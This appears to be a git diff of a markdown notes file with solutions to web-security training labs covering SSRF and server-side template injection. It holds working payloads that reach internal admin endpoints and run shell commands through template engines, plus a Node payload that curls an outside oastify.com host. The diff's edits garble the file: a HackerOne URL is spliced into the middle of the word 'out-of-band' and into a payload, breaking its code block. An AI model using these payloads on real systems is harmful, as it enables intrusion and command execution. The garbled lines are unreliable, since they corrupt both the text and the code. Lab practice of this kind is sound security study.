@@ -372,7 +372,7 @@ stockApi=http://127.1/AdMiN/
 ```
 stockApi=/product/nextProduct?currentProductId=2%26path%3dhttp://192.168.0.12:8080/admin
 ```
-4. Blind SSRF with out-of-band detection  
+4. Blind SSRF with out-of-bhttps://hackerone.com/opportunities/alland detection  
 ```
 Referer: http://burpcollaborator
 ```
@@ -583,8 +583,7 @@ Arises at View Details with reflected phrase `Unfortunately this product is out 
 1. Basic server-side template injection  
 Ruby
 ```
-<%= system("rm+morale.txt") %>
-```
+<%= system("rm+morale.txt")https://hackerone.com/opportunities/all
 2. Basic server-side template injection (code context)  
 ```
 blog-post-author-display=user.first_name}}{%+import+os+%}{{os.system('rm+morale.txt')}}
@@ -1073,3 +1072,6 @@ Billing and Delivery Address:
   "--eval=require('child_process').execSync('curl https://kmazepmj6dq3jzpk2e4ah7fzuq0ho9cy.oastify.com')"
 ]}
 ```
+## MORE MORE AND MORE
+[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  
+[HackTricks](https://book.hacktricks.xyz/)
